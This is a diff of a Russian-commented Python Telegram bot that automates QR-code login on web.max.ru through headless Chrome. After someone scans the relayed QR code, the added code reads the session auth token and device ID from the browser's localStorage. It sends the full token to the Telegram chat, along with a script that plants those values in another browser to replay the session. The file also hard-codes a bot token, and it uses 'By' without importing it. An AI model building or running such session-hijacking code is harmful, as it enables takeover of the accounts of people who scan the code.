@@ -1,17 +1,17 @@
 """
-Telegram бот для max.ru с выполнением JS команд и получением результата
+Telegram бот: QR-код → ожидание входа → выполнение команды → результат
 """
 
 import logging
 import asyncio
 from io import BytesIO
-from telegram import Update, InputFile
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 import os
 import time
-import json
+import threading
 
 # Токен из переменных окружения
 TOKEN = os.environ.get('TOKEN', '8294429332:AAHDw84Fkyz-E0HIXynS0YdGRkLcjI8ek4')
@@ -19,6 +19,9 @@ URL = "https://web.max.ru"
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
+
+# Хранилище сессий пользователей
+user_sessions = {}
 
 driver = None
 
@@ -31,203 +34,262 @@ def get_driver():
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--disable-gpu')
         chrome_options.add_argument('--window-size=1920x1080')
-        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
         driver = webdriver.Chrome(options=chrome_options)
     return driver
 
-def execute_and_get_result():
-    """Выполняет JS команду и возвращает результат"""
+def check_authorization():
+    """Проверяет, выполнен ли вход на сайт"""
     global driver
     
     try:
-        # Ваша JS команда
-        js_command = """
-        let deviceId = localStorage.getItem('__oneme_device_id');
-        let auth = localStorage.getItem('__oneme_auth');
+        # Проверяем наличие данных авторизации в localStorage
+        has_auth = driver.execute_script("""
+            let auth = localStorage.getItem('__oneme_auth');
+            let deviceId = localStorage.getItem('__oneme_device_id');
+            return auth !== null && deviceId !== null;
+        """)
         
-        // Формируем результат
-        let result = {
-            deviceId: deviceId,
-            auth: auth,
-            timestamp: new Date().toISOString(),
-            script: `
+        return has_auth
+    except:
+        return False
+
+def execute_command_and_get_result():
+    """Выполняет команду и возвращает результат"""
+    global driver
+    
+    try:
+        # Ваша команда
+        result = driver.execute_script("""
+            let deviceId = localStorage.getItem('__oneme_device_id');
+            let auth = localStorage.getItem('__oneme_auth');
+            
+            let result = {
+                deviceId: deviceId,
+                auth: auth,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            };
+            
+            // Формируем команду очистки
+            result.cleanupScript = `
 sessionStorage.clear();
 localStorage.clear();
 localStorage.setItem('__oneme_device_id', '${deviceId}');
 localStorage.setItem('__oneme_auth', '${auth}');
 window.location.reload();
-            `
-        };
+            `;
+            
+            return result;
+        """)
         
-        // Выводим в консоль (для логов)
-        console.log('Device ID:', deviceId);
-        console.log('Auth:', auth);
+        return result
+    except Exception as e:
+        logger.error(f"Ошибка выполнения команды: {e}")
+        return None
+
+async def wait_for_login_and_execute(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
+    """Ожидает входа и выполняет команду"""
+    global driver
+    
+    try:
+        # Отправляем сообщение о начале ожидания
+        status_msg = await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="🔄 **Ожидание входа в аккаунт...**\n\nПосле сканирования QR-кода и входа, я автоматически выполню команду.",
+            parse_mode='Markdown'
+        )
         
-        // Возвращаем результат
-        return result;
-        """
-        
-        # Выполняем команду и получаем результат
-        result = driver.execute_script(js_command)
-        
-        # Форматируем результат для отправки
-        formatted_result = f"""📊 **Результат выполнения JS:**
+        # Ждем входа (проверяем каждые 5 секунд, максимум 3 минуты)
+        max_attempts = 36  # 36 * 5 = 180 секунд = 3 минуты
+        for attempt in range(max_attempts):
+            await asyncio.sleep(5)
+            
+            if check_authorization():
+                # Вход выполнен!
+                await context.bot.edit_message_text(
+                    chat_id=update.effective_chat.id,
+                    message_id=status_msg.message_id,
+                    text="✅ **Вход выполнен!**\n\nВыполняю команду...",
+                    parse_mode='Markdown'
+                )
+                
+                # Выполняем команду
+                result = execute_command_and_get_result()
+                
+                if result:
+                    # Форматируем результат
+                    result_text = f"""📊 **Результат выполнения команды:**
 
 **Device ID:** `{result.get('deviceId', 'не найден')}`
 
-**Auth:** `{result.get('auth', 'не найден')}`
+**Auth:** `{result.get('auth', 'не найден')[:50]}...`
 
-**Время:** {result.get('timestamp', '')}
+**Время входа:** {result.get('timestamp', '')}
 
-**Сгенерированный скрипт:**
+**User Agent:** {result.get('userAgent', '')}
+
+**URL:** {result.get('url', '')}
+
+**Команда для очистки:**
 ```javascript
-{result.get('script', '')}
+{result.get('cleanupScript', '')}
 ```"""
+                    
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=result_text,
+                        parse_mode='Markdown'
+                    )
+                    
+                    # Отправляем также отдельно auth для удобства
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"🔑 **Полный auth:**\n`{result.get('auth', '')}`",
+                        parse_mode='Markdown'
+                    )
+                else:
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text="❌ Не удалось выполнить команду"
+                    )
+                
+                # Очищаем сессию
+                if user_id in user_sessions:
+                    del user_sessions[user_id]
+                
+                return
+            
+            # Обновляем сообщение с счетчиком
+            if attempt % 6 == 0:  # Каждые 30 секунд
+                remaining = (max_attempts - attempt) * 5
+                await context.bot.edit_message_text(
+                    chat_id=update.effective_chat.id,
+                    message_id=status_msg.message_id,
+                    text=f"🔄 **Ожидание входа...**\n\n"
+                         f"Время ожидания: {remaining} секунд\n"
+                         f"После входа команда выполнится автоматически.",
+                    parse_mode='Markdown'
+                )
         
-        return formatted_result, result
+        # Время вышло
+        await context.bot.edit_message_text(
+            chat_id=update.effective_chat.id,
+            message_id=status_msg.message_id,
+            text="❌ **Время ожидания истекло**\n\nПопробуйте еще раз с командой /qr",
+            parse_mode='Markdown'
+        )
         
     except Exception as e:
-        logger.error(f"Ошибка выполнения JS: {e}")
-        return f"❌ Ошибка выполнения JS: {str(e)}", None
+        logger.error(f"Ошибка в wait_for_login: {e}")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"❌ Ошибка: {str(e)[:200]}"
+        )
+    finally:
+        if user_id in user_sessions:
+            del user_sessions[user_id]
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
     await update.message.reply_text(
-        "👋 **Бот для max.ru**\n\n"
-        "🔹 **/js** - выполнить JS команду и показать результат\n"
-        "🔹 **/qr** - получить QR-код\n"
-        "🔹 **/full** - выполнить JS + получить QR-код\n"
-        "🔹 **/status** - проверить статус",
+        "👋 **Бот для авторизации на max.ru**\n\n"
+        "🔹 **/qr** - получить QR-код и ожидать входа\n"
+        "🔹 После сканирования QR и входа, я автоматически выполню команду\n"
+        "🔹 Результат придет сюда",
         parse_mode='Markdown'
     )
 
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("✅ Бот работает")
-
-async def js_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Выполняет JS и присылает результат"""
-    msg = await update.message.reply_text("🔄 Выполняю JS команду...")
+async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Получение QR-кода и ожидание входа"""
+    user_id = str(update.effective_user.id)
+    
+    # Проверяем, нет ли уже активной сессии
+    if user_id in user_sessions:
+        await update.message.reply_text("⚠️ У вас уже есть активная сессия. Подождите или отмените предыдущую.")
+        return
+    
+    msg = await update.message.reply_text("🔄 **Получаю QR-код...**", parse_mode='Markdown')
     
     try:
         driver = get_driver()
         
         # Загружаем страницу
-        logger.info("Загружаю страницу...")
         driver.get(URL)
         time.sleep(5)
         
-        # Выполняем JS и получаем результат
-        result_text, result_data = execute_and_get_result()
-        
-        # Отправляем результат
-        await msg.delete()
-        
-        # Если результат слишком длинный, разбиваем на части
-        if len(result_text) > 4000:
-            parts = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
-            for part in parts:
-                await update.message.reply_text(part, parse_mode='Markdown')
-        else:
-            await update.message.reply_text(result_text, parse_mode='Markdown')
-        
-        # Если есть auth, покажем первые символы
-        if result_data and result_data.get('auth'):
-            auth_preview = result_data['auth'][:50] + "..."
-            await update.message.reply_text(f"🔑 Auth (первые 50 символов): `{auth_preview}`", parse_mode='Markdown')
-        
-    except Exception as e:
-        logger.error(f"Ошибка: {e}")
-        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
-
-async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Только QR-код"""
-    msg = await update.message.reply_text("🔄 Получаю QR-код...")
-    
-    try:
-        driver = get_driver()
-        driver.get(URL)
-        time.sleep(10)
-        
-        # Ищем QR-код
-        screenshot = driver.get_screenshot_as_png()
-        img_io = BytesIO(screenshot)
-        img_io.name = "qrcode.png"
-        
-        await msg.delete()
-        await update.message.reply_photo(
-            photo=InputFile(img_io, filename="qrcode.png"),
-            caption="✅ QR-код получен!"
-        )
-        
-    except Exception as e:
-        logger.error(f"Ошибка: {e}")
-        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
-
-async def full_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Выполняет JS, присылает результат и QR-код"""
-    msg = await update.message.reply_text("🔄 Выполняю полную последовательность...")
-    
-    try:
-        driver = get_driver()
-        
-        # Шаг 1: Загружаем страницу
-        await msg.edit_text("📡 Загружаю страницу...")
-        driver.get(URL)
-        time.sleep(5)
-        
-        # Шаг 2: Выполняем JS
-        await msg.edit_text("⚙️ Выполняю JS команду...")
-        result_text, result_data = execute_and_get_result()
-        
-        # Шаг 3: Отправляем результат JS
-        await msg.edit_text("📤 Отправляю результат...")
-        await update.message.reply_text(result_text, parse_mode='Markdown')
-        
-        # Шаг 4: Обновляем страницу (если нужно)
-        if result_data and result_data.get('deviceId'):
-            await update.message.reply_text("🔄 Обновляю страницу...")
-            driver.refresh()
-            time.sleep(5)
-        
-        # Шаг 5: Получаем QR-код
-        await update.message.reply_text("🔍 Ищу QR-код...")
-        
-        # Ищем SVG или делаем скриншот
+        # Ищем QR-код (SVG)
         svg_elements = driver.find_elements(By.TAG_NAME, "svg")
+        
         if svg_elements:
+            # Делаем скриншот QR-кода
             screenshot = svg_elements[0].screenshot_as_png
+            img_io = BytesIO(screenshot)
+            img_io.name = "qrcode.png"
+            
+            await msg.delete()
+            
+            # Отправляем QR-код с инструкцией
+            keyboard = [[InlineKeyboardButton("✅ Я ОТСКАНИРОВАЛ", callback_data="scanned")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_photo(
+                photo=InputFile(img_io, filename="qrcode.png"),
+                caption="📱 **QR-код получен!**\n\n"
+                        "1️⃣ Отсканируйте код\n"
+                        "2️⃣ Подтвердите вход на сайте\n"
+                        "3️⃣ Нажмите кнопку 'Я ОТСКАНИРОВАЛ'\n\n"
+                        "⏳ После входа команда выполнится автоматически",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+            
+            # Сохраняем сессию пользователя
+            user_sessions[user_id] = {
+                'status': 'waiting_qr',
+                'message_id': msg.message_id
+            }
+            
         else:
-            screenshot = driver.get_screenshot_as_png()
-        
-        img_io = BytesIO(screenshot)
-        img_io.name = "qrcode.png"
-        
-        await update.message.reply_photo(
-            photo=InputFile(img_io, filename="qrcode.png"),
-            caption="✅ Готово!"
-        )
-        
-        await msg.delete()
-        
+            await msg.edit_text("❌ Не удалось найти QR-код на странице")
+            
     except Exception as e:
         logger.error(f"Ошибка: {e}")
         await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка нажатия кнопки"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = str(update.effective_user.id)
+    
+    if query.data == "scanned":
+        await query.edit_message_caption(
+            caption="✅ **QR-код отсканирован!**\n\n"
+                    "⏳ Ожидаю подтверждения входа на сайте...\n"
+                    "Команда выполнится автоматически.",
+            parse_mode='Markdown'
+        )
+        
+        # Запускаем ожидание входа в фоне
+        asyncio.create_task(wait_for_login_and_execute(update, context, user_id))
 
 async def main():
+    """Главная функция"""
     app = Application.builder().token(TOKEN).build()
     
-    # Добавляем все команды
+    # Добавляем обработчики
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("status", status))
-    app.add_handler(CommandHandler("js", js_command))
     app.add_handler(CommandHandler("qr", qr_command))
-    app.add_handler(CommandHandler("full", full_command))
+    app.add_handler(CallbackQueryHandler(button_callback))
     
+    # Запускаем бота
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
     
-    logger.info("✅ Бот запущен!")
-    logger.info("Команды: /js, /qr, /full")
+    logger.info("✅ Бот запущен в режиме QR → вход → команда → результат")
     
     try:
         while True:
